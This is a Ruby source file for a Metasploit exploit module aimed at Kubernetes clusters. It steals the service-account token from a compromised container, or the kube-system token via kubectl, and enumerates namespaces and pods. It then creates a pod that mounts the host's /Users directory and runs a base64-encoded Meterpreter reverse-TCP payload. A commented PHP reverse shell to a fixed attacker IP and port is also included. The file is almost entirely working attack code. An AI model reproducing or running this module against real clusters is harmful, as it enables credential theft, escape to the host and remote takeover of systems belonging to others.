# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module Kubernetes
  module Error
    class ApiError < ::StandardError
    end

    class AuthenticationError < ApiError
    end

    class UnexpectedStatusCode < ApiError
      attr_reader :status_code

      def initialize(status_code)
        super
        @status_code = status_code
      end
    end
  end

  class Client
    def initialize(config)
      @http_client = config.fetch(:http_client)
      @token = config[:token]
    end

    def list_namespace(options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri('/api/v1/namespaces')
        },
        options
      )

      json
    end

    def list_pod(namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods")
        },
        options
      )

      json
    end

    def create_pod(data, namespace, options = {})
      res, json = call_api(
        {
          'method' => 'POST',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods"),
          'data' => JSON.pretty_generate(data)
        },
        options
      )

      if res.code != 201
        raise Kubernetes::Error::UnexpectedStatusCode.new(res.code)
      end

      json
    end

    def delete_pod(name, namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'DELETE',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods/#{name}"),
          'headers' => {}
        },
        options
      )

      json
    end

    private

    attr_reader :http_client

    # TODO: Support receiving data directly as a table?
    # Accept: application/json;as=Table;g=meta.k8s.io;v=v1beta1
    # https://kubernetes.io/docs/reference/using-api/api-concepts/#receiving-resources-as-tables
    def call_api(request, options = {})
      token = options.fetch(:token, @token)

      res = http_client.send_request_raw(
        request.merge(
          {
            'headers' => request.fetch('headers', {}).merge(
              {
                'Authorization' => "Bearer #{token}",
                'Accept' => 'application/json'
              }
            )
          }
        )
      )

      if res.nil? || res.body.nil?
        raise Kubernetes::Error::ApiError
      elsif res.code == 401
        raise Kubernetes::Error::AuthenticationError
      end

      json = res.get_json_document
      if json.nil?
        raise Kubernetes::Error::ApiError
      end

      [res, json.deep_symbolize_keys]
    end
  end
end

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'kubernetes',
        'Description' => %q{
          kubernetes

          usage:

          rerun session=-1 https://kubernetes.docker.internal:6443 verbose=true lhost=192.168.123.1
        },
        'License' => MSF_LICENSE,
        'Author' => [
        ],
        'References' => [
          # ['URL', 'https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/']
        ],
        'Stance' => Msf::Exploit::Stance::Aggressive,
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          # 'SideEffects' => [ ARTIFACTS_ON_DISK ],
          # 'Reliability' => [ UNRELIABLE_SESSION ],
          # 'Stability' => [ SERVICE_RESOURCE_LOSS ]
        },
        'DefaultOptions' => {
          'SSL' => true
        },
        'Targets' => [
          [
            'Linux x86',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux x86_64',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'php',
            {
              'Platform' => 'php',
              'Arch' => [ARCH_PHP],
              'PAYLOAD' => 'php/meterpreter/reverse_tcp',
            }
          ],

        ],
        # 'DisclosureDate' => '2020-01-22',
        'DefaultTarget' => 0
      # 'Compat' => {
      #   'Meterpreter' => {
      #     'Commands' => %w[
      #       stdapi_sys_process_execute
      #     ]
      #   }
      # }
      )
    )

    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        Opt::RPORT(6443),
      ]
    )
    # https://kubernetes.docker.internal:6443
  end

  # def setup
  # end

  def check
    # For the check command
  end

  def exploit
    # Hack for now, running remotely versus compromised container
    if session
      print_status("extracting service token from session")
      token = read_file('/run/secrets/kubernetes.io/serviceaccount/token')
      unless token.nil?
        p = store_loot("jwt", "text/plain", session, token, "token", "kubernetes service token")
        vprint_good("kubernetes service token saved: #{p}")
      end
    else
      # grab kube-system token from the host
      print_status("extracting service token from host")
      token = `kubectl get secret -n kube-system $(kubectl -n kube-system get serviceaccount default -o jsonpath="{.secrets[0].name}") -o jsonpath="{.data.token}" | base64 --decode`
    end

    kubernetes_client = Kubernetes::Client.new({ http_client: self, token: token })

    namespaces = kubernetes_client.list_namespace[:items]
    print_namespaces(namespaces)
    namespaces.each do |namespace|
      namespace_name = namespace.dig(:metadata, :name)
      pods = kubernetes_client.list_pod(namespace_name)[:items]
      print_pods(namespace, pods)
    end

    print_good("Creating new pod with kubernetes token")

    # TODO: Choose this based on whether it's a remote exploit, or through a session
    namespace_name = namespaces.first.dig(:metadata, :name)
    image_name = kubernetes_client.list_pod(namespace_name).dig(:items, 0, :spec, :containers, 0, :image)
    random_identifiers = Rex::RandomIdentifier::Generator.new({ char_set: Rex::Text::LowerAlpha })

    cmd = "echo -n  #{Rex::Text.encode_base64("#{payload.encoded_exe}")} | base64 --decode > shell; chmod +x shell; ./shell"
    # cmd = "echo -n #{Rex::Text.encode_base64("#{payload.encoded}")} | base64 --decode | php -e"
    # cmd = "php -r '$sock=fsockopen(\"192.168.123.1\",4444);exec(\"sh <&3 >&3 2>&3\");'"

    print_good cmd

    new_pod_definition = {
      apiVersion: 'v1',
      kind: 'Pod',
      metadata: {
        name: random_identifiers[:pod_name],
        labels: {}
      },
      spec: {
        containers: [
          {
            name: random_identifiers[:container_name],
            image: image_name,

            command: [
              "/bin/sh",
              "-c",
              cmd
            ],

            # TODO: Alternative approach, sleep, then exec out of band, either with a reverse shell payload, or potentially use the stream api
            # Has the benefit of not crash looping and causing detection
            # command: [
            #   "/bin/sh",
            #   "-c",
            #   "sleep 20000"
            # ],

            volumeMounts: [
              {
                mountPath: '/host_mnt',
                name: random_identifiers[:volume_name],
              }
            ]
          }
        ],
        volumes: [
          {
            name: random_identifiers[:volume_name],
            hostPath: {
              # path: '/'
              path: '/Users'
            }
          }
        ]
      }
    }

    pod_result = kubernetes_client.create_pod(
      new_pod_definition,
      namespace_name
    )

    print_good "Pod created: #{random_identifiers[:pod_name]}"
    print_good "Waiting for shell..."
    # TODO: Poll for success
  end

  def print_namespaces(namespaces)
    table = Rex::Text::Table.new(
      'Header' => 'Namespaces',
      'Columns' => ['#', 'name']
    )

    namespaces.each.with_index do |item, i|
      table << [i, item.dig(:metadata, :name)]
    end

    print(table.to_s)
    print_line('No rows') if namespaces.empty?
    print_line
  end

  def print_pods(namespace, pods)
    namespace_name = namespace.dig(:metadata, :name)
    table = Rex::Text::Table.new(
      'Header' => "Pods (namespace: #{namespace_name})",
      'Columns' => ['#', 'namespace', 'name', 'status', 'containers']
    )

    pods.each.with_index do |item, i|
      containers = item.dig(:spec, :containers).map { |container| "#{container[:name]} (#{container[:image]})" }
      table << [i, namespace_name, item.dig(:metadata, :name), item.dig(:status, :phase), containers.join(', ')]
    end

    print(table.to_s)
    print_line('No rows') if pods.empty?
    print_line
  end
end
